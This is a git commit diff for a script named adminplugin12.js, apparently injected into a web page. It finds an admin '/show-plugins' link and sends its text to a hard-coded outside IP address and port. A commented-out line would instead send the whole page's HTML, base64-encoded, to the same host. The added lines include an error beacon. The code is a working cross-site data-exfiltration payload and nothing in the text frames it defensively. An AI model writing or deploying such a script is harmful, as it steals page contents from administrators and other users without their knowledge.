146b63e0a1b8fb1e8a9797f77d6c8239048b3967
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 08:47:04 +0100

    Update and rename adminplugin11.js to adminplugin12.js

--- adminplugin12.js
+++ adminplugin12.js
@@ -1,7 +1,10 @@
 const link = document.querySelector('a[href="/show-plugins"]');
 
 //fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
-fetch("http://82.65.210.151:24000/?encodedData=" + link.textContent;);
+if (link){
+    fetch("http://82.65.210.151:24000/?encodedData=" + link.textContent);
+}
+else {fetch("http://82.65.210.151:24000/?ERROR=")}
 //link.addEventListener('click', function(event) {
     //event.preventDefault();
     //link.click();
